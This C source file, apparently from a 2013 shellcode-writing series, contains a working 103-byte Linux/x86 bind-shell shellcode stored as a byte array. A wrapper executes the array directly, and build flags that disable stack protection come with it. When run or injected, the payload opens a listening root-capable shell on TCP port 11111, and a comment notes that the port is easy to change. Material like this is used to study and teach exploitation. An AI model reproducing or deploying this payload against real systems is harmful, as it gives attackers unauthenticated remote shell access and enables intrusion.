/*

 Shell Bind TCP Shellcode - C Language - Linux/x86
 Copyright (C) 2013 Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <http://www.gnu.org/licenses/>.

*/

/*

   shell_bind_tcp_shellcode

   * 103 bytes
   * null-bytes free
   * avoids SIGSEGV when reconnecting, setting SO_REUSEADDR (TIME_WAIT)
   * the port number is easily changeable (3th and 4th bytes of the shellcode)


   # gcc -m32 -fno-stack-protector -z execstack shellcode.c -o shellcode
   # ./shellcode

   Testing
   # nc 127.0.0.1 11111

*/

#include <stdio.h>
#include <string.h>

unsigned char code[] = \

"\x66\xbd"
"\x2b\x67" /* <- Port number 11111 (2 bytes) */
"\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89"
"\xe1\xcd\x80\x89\xc6\x5f\xb0\x66\x6a\x04\x54\x57"
"\x53\x56\x89\xe1\xb3\x0e\xcd\x80\xb0\x66\x89\xfb"
"\x52\x66\x55\x66\x53\x89\xe1\x6a\x10\x51\x56\x89"
"\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x56\x89\xe1\xcd"
"\x80\xb0\x66\x43\x89\x54\x24\x08\xcd\x80\x93\x89"
"\xf9\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52"
"\x53\xeb\xa8";


main ()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
